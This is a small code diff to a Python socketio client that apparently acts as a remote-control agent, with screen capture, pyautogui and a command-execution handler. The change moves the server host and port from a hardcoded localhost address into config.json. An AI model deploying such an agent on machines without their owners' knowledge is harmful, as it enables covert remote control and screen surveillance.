@@ -12,10 +12,15 @@ import subprocess
 from PIL import ImageGrab, ImageDraw
 import pyautogui
 
+with open('config.json') as json_file:
+    data = json.load(json_file)
+
+#Defined in config.json
+socket_url = data["socket_url"]
+socket_port = data["socket_port"]
+
 logging.basicConfig(level=logging.DEBUG)
 sio = socketio.Client(logger=True, engineio_logger=True)
-
-#Id of this agent
 
 
 #Info about the machine and the ip
@@ -137,7 +142,7 @@ def execute_command(data):
 
 
 try:
-    sio.connect('http://127.0.0.1:8080', transports=['websocket'])
+    sio.connect(f'http://{socket_url}:{socket_port}', transports=['websocket'])
     sio.wait()
 except Exception as e:
     print(f"Failed to connect to server: {e}")
